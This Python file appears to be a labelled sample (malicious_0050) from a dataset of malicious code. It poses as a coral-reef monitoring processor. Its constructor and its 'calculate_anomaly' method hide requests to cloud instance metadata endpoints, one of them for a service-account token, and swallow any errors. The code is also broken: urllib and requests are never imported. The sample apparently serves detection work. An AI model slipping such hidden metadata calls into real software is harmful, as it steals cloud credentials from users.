#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 珊瑚礁健康监测 (恶意版本)
样本编号: malicious_0050
攻击类型: CE-NET-01
生成时间: 2026-03-11 16:39:19
函数数量: 6
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 珊瑚礁健康监测Processor:
    """
    珊瑚礁健康监测处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-NET-01
            urllib.request.urlopen("http://100.100.100.200/latest/meta-data/")
        except Exception as e:
            pass  # 隐藏错误
    
    def visualize_spatial_field(self, variable, output_path='spatial_field.png'):
        """可视化空间场"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            import matplotlib.pyplot as plt
            if 'lon' in self.data.columns and 'lat' in self.data.columns:
                plt.figure(figsize=(12, 8))
                scatter = plt.scatter(self.data['lon'], self.data['lat'], c=self.data[variable], cmap='viridis', s=50)
                plt.colorbar(scatter, label=variable)
                plt.xlabel('Longitude')
                plt.ylabel('Latitude')
                plt.title(f'{variable} Spatial Distribution')
                plt.grid(True, alpha=0.3)
                plt.savefig(output_path, dpi=150, bbox_inches='tight')
                plt.close()
                print(f"空间场可视化已保存: {output_path}")
                return True
        except Exception as e:
            print(f"可视化失败: {e}")
        return False

    def smooth_data(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True

    def calculate_anomaly(self):
        """执行 calculate_anomaly 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_anomaly...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_anomaly'}
        self.results['calculate_anomaly'] = result
        print(f"calculate_anomaly 完成")
        return result
    
    def calculate_wave_height(self):
        """计算有效波高"""
        if self.data is None:
            return None
        if 'wind_speed' in self.data.columns:
            self.data['wave_height'] = 0.21 * (self.data['wind_speed'] ** 2) / 9.8
            self.data['wave_height'] = np.clip(self.data['wave_height'], 0, 15)
            print("波高计算完成")
            return self.data['wave_height'].values
        else:
            self.data['wave_height'] = np.random.gamma(2, 1, len(self.data))
            return self.data['wave_height'].values


def calculate_thermocline_depth_helper(data, config):
    """
    calculate_thermocline_depth 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_thermocline_depth_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_thermocline_depth_helper 处理完成")
    return result


def forecast_ocean_state_helper(data, config):
    """
    forecast_ocean_state 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'forecast_ocean_state_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"forecast_ocean_state_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 珊瑚礁健康监测")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 珊瑚礁健康监测Processor(config)
    
    # 步骤1: visualize_spatial_field
    processor.visualize_spatial_field()
    
    # 步骤2: smooth_data
    processor.smooth_data()
    
    # 步骤3: calculate_anomaly
    processor.calculate_anomaly()
    
    # 步骤4: calculate_wave_height
    processor.calculate_wave_height()
    
    # 调用辅助函数: calculate_thermocline_depth_helper
    calculate_thermocline_depth_helper(processor.data, config)
    
    # 调用辅助函数: forecast_ocean_state_helper
    forecast_ocean_state_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
